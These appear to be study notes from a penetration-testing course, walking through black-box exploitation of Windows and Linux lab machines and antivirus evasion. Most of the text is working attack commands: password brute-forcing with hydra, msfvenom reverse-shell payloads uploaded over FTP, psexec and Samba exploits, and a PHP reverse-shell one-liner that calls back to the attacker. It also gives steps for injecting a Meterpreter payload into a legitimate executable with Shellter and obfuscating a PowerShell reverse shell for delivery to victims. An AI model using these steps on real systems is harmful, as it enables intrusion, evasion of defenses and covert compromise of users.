  

### **_==Windows Exploitation ( Black Box )==_**

> It’s simulated to a black box windows exploitation

  

- ==_Windows Black Box Penetration Test_==

> Security assessment whereby the penetration tester is not provided with any information regarding the target system , or network

> the process of penetration testing is , the way the penetration testing process should be ⇒
> 
> - if the pentest lead assigned u to do a exploitation , your job just to gain access to the system just
> - The post exploitation is the way to privis escalation .. etc.

  

- ==Windows Black Box==

> on This Step we enum info as much as possible of the target system by , port scanning , identify the services running , take notes about that , identify the target system ip , versions , type …etc.

  

- Port Scanning & Enumeration - Windows Black Box
    
    > first we need to find the target ip
    
    - `cat /etc/hosts` ⇒ and we can see the target ip
    
    > After we found the target ip , make a dir to make all thing organized , then we need enum this ip
    
    - `nmap -sS -sC -sV -O <target ip >` ⇒ to identify the open ports and what services are running on this port and find some banner information
    
    > If we found a open ports , we need to identify what is running on it so try every port , open it ping , try to login , visit it … etc.
    
    > then we should open msfconsole and search for exploit to this services on the open ports
    
    - `services postgresel start` && `msfconsole` && `workspace -a win-BlackBox`
    - If we Found SMB ⇒ `search smb_version` && `use auxiliary/scanner/smb/smb_version` && `set rhost <target ip >` && `run`
    
      
    
      
    

  

- Targeting Microsoft IIS FTP
    
    > ==On Port 21 Open and 80 and the service running is ⇒ Microsoft ftpd== && ==Microsoft-IIS httpd 7.5==
    
    > When u see a Microsoft ftpd , so think of the authenticated use can modify or upload via ftp , files and website files .
    
    - `ls -al /usr/share/nmap/scripts/ | grep ftp-` && `nmap -sV -p 21 - -script=ftp-anon <target ip>` ⇒ to search for nmap script related to ftp , and use ftp script to check if we can login using anonymous
    - `hydra -L /usr/share/wordlists/Metasploit/unix_users.txt -P /usr/share/wordlists/Metasploit/unix_password.txt <target ip > ftp` ⇒ to brute force the ftp login
    - After get the username and password ⇒ `ftp <target ip> <port>` , then enter the username and password
    
    > After we login , let’s identify what a file extinction can be uploaded , after identify that we need to generate a msfvenom payload to receive a revers shell ( _let’s assume that we found a asp file_ )
    
    - `msfvenom -p windows/shell/reverse_tcp LHOST=<our ip > LPORT=1234 -f asp > shell.aspx` ⇒ here we make a payload to get reverse shell when we upload
    - `Back to ftp login` && `put shell.aspx` ⇒ to upload it to the server
    - On msfconsole ⇒ `use multi/handler` && `set payload windows/shell/reverse_tcp` && `set lhost <our ip>` && `set lport 1234` && `run` ⇒ here we set up a multi/handler listener , and just we need to `navigate the shell.aspx on browser`
    - we can modify the any file ⇒ `get <file we want to modify >` && we can see it on our machine , `gedit <file >` && modify it by any thing u want && on FTP session ⇒ `put <file >`
    
      
    

  

- Targeting OpenSSH
    
    - ==On Port 22 Open ,The service running is ⇒ OpenSSH 7.1==
    - _==On Services like FTP , SSH ,SMB ⇒ on same target system if you found a username like administrator , so all services SSH FTP SMB , the username to login on it will be administrator , so what actual u need to bruteforce is the password just==_
    - With searchsploit the 2 exploit for OPENSSH 7.1 is just username enumeration , on our case we don’t need it
    - `hydra -l administrator -P /usr/share/wordlist/metasploit/unix_password.txt <target ip> ssh` ⇒ to brute force the login of ssh
    - `ssh administrator@<target ip>` && `enter the password`
    - `msfconsole` && `use auxiliary/scanner/ssh/ssh_login` && `set rhost <target ip>` && `set username administrator` && `set password <the password from bruteforce>` && `run` && `session -u 1` ⇒ to get a metepreter session instead of bind shell
    
      
    

  

- Targeting SMB
    
    > ==On Port 445 , The service running is ⇒ Microsoft server 2008 R2==
    
    > ==As from the previous services on same target , we found a administrator account , so we have the username==
    
    - `hydra -l administrator -P /usr/share/wordlist/metasploit/unix_password.txt <target ip> smb` ⇒ to brute force the login of SMB
    - `smbclient -L <target ip> -U administrator` && `enter password` ⇒ to obtain the shares on smb
    - `smbmap -u administrator -p <password> -H <target ip>` ⇒ to obtain the shares on smb
    - `enum4linux -u administrator -p <password> -U <target ip>` ⇒ to list all account on system
    - `msfconsole` && `use auxiliary/scanner/smb/smb_enumusers` && `set rhost <target ip>` && `set username administrator` && `set password <the password from bruteforce>` && `run` ⇒ it’s like enum4linux
    - `locate` `[psexec.py](http://psexec.py)` && `cd Desktop` && `cp /usr/share/doc/python3-impacket/examples/psexec.py` && `chmod +x psexec.py` && `python3 psexec.py Administartor@<target ip>` && `enter password` ⇒ we will get a command prompt on target
    - `msfconsole` && `use exploit/windows/smb/psexec` && `set rhost <target ip>` && `set smbuser administrator` && `set smbpass <the password from bruteforce>` && `run` ⇒ it’s psexec but on msfconsole ( if target 64 change the payload )
    
    > ==_windows server 2008 R2 is vuln to eternblue , so if we dose not have the username and password we can gain access , by eternblue_==
    

  

- Targeting MySQL Database Server
    
    > ==On Port 3306 , The service running is ⇒ MySQL 5.5.20-log , it’s running on Apache/2.2.21 and PHP/5.3.10==
    
    - `msfconsole`
        
        - `use auxiliary/scanner/mysql/mysql_login` && `set rhost <target ip>` && `set passfile /usr/share/wordlist/metasploit/unix_password.txt` && `run` ⇒ to bruteforce the MySQL login
        - `mysql -u root -p <password we obtain from bruteforce > -h <target ip>` ⇒ to login with mysql
        
        - mysql commands
            
            - show databases;
            
        
          
        
    
    - The WAMP stack for windows typically store the actual web application that are being hosted on it , as well as the configuration files of them , On C:// ⇒ file called `wamp` , see all files it’s ;)
    - ==_On wamp file ⇒ cd alias\\ ⇒ u will find phpmyadmin.conf ( This file contain the configuration of php so how can access , allow how , deny how ) ⇒ we can download it , edit it , and allow all to access , and remove deny all ⇒ back to metepreter session , upload phpmyadmin.conf ⇒ we can now access the php ;)_==
    - ==_but to do that we need to restart the apache ⇒ on metepreter session ⇒_== ==_`shell`_== ==_&&_== ==_`net stop wampapache`_== ==_&&_== ==_`net start wampapache`_== ==_⇒ now if we try to access the php we can access it_== _;)_
    

  

💡

Check Targeting MySQL Database Server Lab

  

  

  

### ==Linux== ==**_Exploitation ( Black Box )_**==

> It’s simulated to a black box Linux exploitation

  

- ==Linux== ==_Black Box Penetration Test_==

> The target is to get access on the target system

  

==Linux Black Box==

> we will target a low hanging fruit

  

- Port Scanning & Enumeration - Linux
    
    - First find the target ip ⇒ `cat /etc/hosts` && `ping <target ip>`
    - `nmap -sS -sV -sC -p 1-10000 <target ip>` ⇒ to scan for open ports and what the services running on this open ports
    
    > when nmap return with ? on the end of service name , that’s mean the nmap can’t identify the service name or purpose
    
    > If we found a open ports , we need to identify what is running on it so try every port , open it ping , try to login , visit it … etc.
    
    > then we should open msfconsole and search for exploit to this services on the open ports
    
    - `nc -nv <target ip> <port>` ⇒ to try to connect to this port to grep some banner , infoo ==one of the interesting thing maybe one of this port let u connected and have a root shell on the system just by connect ( Bind shell )==
    
      
    

  

- Targeting vsFTPd
    
    - ==On Port 21 , The service running is ⇒ vsftpd 2.3.4==
    - Try to find if the ftp anonymous is allowed ⇒ `By nmap default scan`
    - If Nmap anonymous is allowed ⇒ `ftp <target ip>` && `enter` && `enter`
    
    > The command u do , is regarding to the permeation of anonymous user allow to do
    
    - `searchsploit vsftpd 2.3.4` ⇒ this version of vsftpd is already Vuln so the Vuln can be found on the service it’s self so the script to exploit it , related to connect with netcat on port 6200 , so if the administrator remove this port we can’t do that
    - if we have a smtp on the target , we can enum the user on the system that will make the bruteforce process more easier ⇒ `msfconsole` && `use auxiliary/scanner/smtp/smtp_enum` && `set rhost <target ip>` && `set unixonly true` && `run` ⇒ that will bruteforce the users on the target , which will make us identify what types of ==users and serves accounts== we have
    - `hydra -l service -P /usr/share/metasploit…/data/wordlists/unix_txt <target ip> ftp` ⇒ to bruteforce by the username we have which is serves account && login
    
    > After u login , if the target run a web server , and for some reasons hosted a WEB Dav/ , so this file can store any file u want , so u can upload a php revers shell on it and gain access to the target system
    
    - `ls -al /usr/share/webshells` && `copy the shell and modify it by` && `modify the ip to your ip addr and port`
    
    > ==On Ftp on most case the interesting file can be found here ⇒ cd /var/www && cd dav && put php-reverse-shell.php==
    
    > ==The dav dir is the only file u can upload any thing on it==
    
    - `nc -nvlp 1234` && `click on the shell after u upload it`
    
      
    
      
    
      
    

  

- Targeting PHP
    
    - ==On Port 80 , The service is running is ⇒ PHP 5.2.4 and dav==
    
    > _==whenever u’r performing a penetration test that involves web applications , you need to analyze or explore all the components of web server like , web server technology , Operating System , web server programming languish , Database .==_
    
    - first if the web server technology is PHP , check first about common php dir like ⇒ `phpinfo.php` …etc.
    - `searchsploit php cgi` && `searchsploit -m 18836` ⇒ so here we downloads the python script to our dir
    - explore the script && `python3` `[18836.py](http://18836.py)` `<target ip> 80`
    
    > so when it executed u can see the phpinfo page return
    
    > Now we need to get a bin/shell ( revers shell ) , so we need to modify the pwn_code variable on the script .
    
    - open the script&&modify the pwn_code variable to⇒
    
    ```
    <?php $sock=fsockopen(”<our ip>” , 1234 );exec(”/bin/sh -i <&4 >&4  2>&4”);?>
    ```
    
    - execute the file && On other tab ⇒ `nc -nvlp <port> 1234` ⇒ to set up a listener to receive a reverse shell from the target
    

  

- Targeting SAMBA
    
    - ==On Port 445 , The service running is ⇒ netbios-ssn samba smbd 3.x - 4.x .==
    - `msfconsole` && `use auxiliary/scanner/smb/smb_version` && `set rhost <target ip>` && `run` ⇒ to identify the exactly version of samba
    
    > We identify that the version of samba is 3.2.20
    
    - `searchsploit samba 3.2.20`
    - `msfconsole` && `use exploit/multi/samba/usermap_script` && `set rhost <target ip>` && `run` ⇒ here we will get a cmd shell && `session -u 1` ⇒ to make it metepreter session
    

  

  

### ==**AV Evasion & Obfuscation**==

💡

AV Detection Methods

- ==Signature Based detection== ⇒ an AV signature is a unique sequence of bytes that uniquely identifies malware . _==So u should ensure to Obfuscated exploit or payload doesn’t match any knows signature in the AV database .==_

> when a new malware comes up the company , with it’s malware analysis , these eng download the malware and analysis it & generate a signature that uniquely identifies that malware , then the company included this signature on his database and all AV solutions added it then .

> ==We can bypass signature-based detection by modifying the malware byte sequence . therefore changing the signature .==

- ==Heuristic-based detection== ⇒ Relies on rules or decisions to determine whether a binary is malicious , it also like for specific patterns within the code or program calls.

- ==Behavior based detection== ⇒ Relies on identifying malware by monitoring it’s behavior . ( used for newer strains of malware ) .

  

- ==AV Evasion With Shellter==

> Defense Evasion consist of techniques that adversaries use to avoid detection throughout their compromise . techniques used for defines evasion include uninstalling/disabling security software or ==_Obfuscating/encrypting_== data and script .

> what we want to do here is to change the signature of the payload file .

> As a example if we generate a metepreter payload with msfvenom and we want to transfer it to modern windows target like windows 10 , that will be detected immediately

> So the AV work like this ⇒ When a new program installed on your machine the AV create a hash of this program and compare this hash with the hashes on it’s database , if any hashes match the program hash it’s malware .

  

- ==AV Evasion Techniques==
    
    - On-disk Evasion Techniques
        
        > Whenever a executable file are transfer to the target system , it will saved on-disk here what actual evasion comes
        
        - `obfuscation` ⇒ refers to the process of concealing something important , valuable , or critical . obfuscation reorganizes code in order to make it harder to analyze or Reverse eng .
        - `Encoding` ⇒ like base64 …etc. the issues here it’s easily reversible .
        - `packing` ⇒ it’s process of generate a executable with new binary structure with smaller size and provide the payload with a new signature .
        - `Crypters` ⇒ encrypts code or payloads and decrypts the encrypted code in memory , the key of decrypts store in stub .
        
          
        
    
      
    
    - In-Memory Evasion Techniques
        
        - Focuses on manipulation of memory and dose not write files to disk.
        - inject payload into a process by leveraging various windows APIS.
        - Payload is then executed in memory in a separate thread .
        
          
        
    
      
    
    💡
    
    One of the best bypass process is to inject our payload into executable file like WINRAR
    
    > So when we transfer it , it can’t be detected because the signature of the file is a normal signature ( WINRAR file )
    
      
    
    - ==AV Evasion With Shellter==
        
        - `sudo apt-get install Shellter -y` ⇒ it’s dynamic shellcode injection tool that used in order to injects shellcode into native windows applications ( just 32-bit application ) .
        - `sudo dpkg —add-architecture i386` ⇒ if the Linux VM just support install 64-bit package we need to add this to it to actual let us install the wine 32-bit
        - `sudo apt-get install wine32` ⇒ wine used to let us to run or execute .exe file on linux and MAC .. etc. ( 32-bit , because the Shellter just create a 32-bit program ) .
        - `cd /usr/share/windows-resources/shellter` && `ls -al`
        - `sudo wine shellter.exe` ⇒ here we open a shellter.exe with wine on linux to start to inject payloads
        
        > ==_Here when the social eng comes , so u need to select a small and simplistic file to inject your payload on it , so that will not let the target to detect your payload and SUS your file_==
        
        - `cd /usr/share/windows-binaries` ⇒ here u can find some exe file u can used to inject your payload on it , like VNC Viewer
        - Make a directory called AVbypass ⇒ `mkdir Avbypass` && copy the file u select to inject your payload on it and paste it on this dir
        - `sudo wine shellter.exe` && `A` && `~/Desktop/AVbypass/vncviewer.exe` ⇒ here it ask us to enter the path of actual file we want to inject our payload on it .
        
        > After it finish , it will ask u if u want to enable stealth mode ⇒ Stealth mode used to ⇒ if u want the program to function normal when the target click on it , write `y`
        
        > ==_what that’s mean , when we write y , so when the target click on the file , the file will open as normal and the vnc viewer will open normal and target will do what he want , bun in background our payload execution , so the target will not detect that , because the program will function normal_==
        
        - Now the shellter will list a some payload u can use , u can generate a custom payload with msfvenom and select `c` &&
        - In my case will use `L` ⇒ to use from the list && select index `<number of payload u want>`
        - `set lhost` && `set lport`
        
        > So after finish ⇒ ==`the malicious file will replace the file we copy it ( original file )`== && `the original file will stored on shellter_backup`
        
        - so if u see the ~/Desktop/AV bypass ⇒ u will see the ==`malicious file`== ==,== ==look as the original , and when we transfer to the target system will function as normal and the target can used it as normal , but when he executed *it our payload will execute and the metepreter session will be created to the target system.==
        - `msfconsole` && `use multi/handler` && `set payload windows/metepreter/reverse_tcp` && `set lhost <our ip>` && `set lport` && `run`
        - ==so now when the target execute the file , and he can used it as he want , the file will be normal , but when he executed it , we will receive a metepreter session opened on our multi/handler , and we hacked the target .==
        

  

- ==Obfuscating PowerShell Code==

> _==Obfuscation==_ ⇒ refers to the process of concealing something important ,valuable , or critical . Obfuscation reorganizes code in order to make it harder to analyze or RE .

> search of ==_Invoke-Obfuscation_== Tool on Github

- Obfuscating PowerShell Code
    
    - `git clone invoke-obfuscation`
    - `sudo apt-get install powershell -y`
    - **From payload CheatSheet** ⇒ **Reverse Shell Cheat Sheet ⇒ Powershell CheatSheet**
    - `pwsh` ⇒ to run powershell on linux
    - On Powershell ⇒ `cd ./Invoke-Obfuscation` && `dir`&& `Import-Module ./Invoke-Obfuscation.psd1`
    - `Invoke-Obfuscation` && `in new tab copy the revers shell code to shell.ps1` && `replace with your ip and port` && `SET SCRIPTPATH <PATH OF REVERS SHELL FILE >`
    - `AST` && `ALL` ⇒ we will see the new script , `copy it , and replace the original script with the new one`
    - ==Send it to the target , with RE let him open it==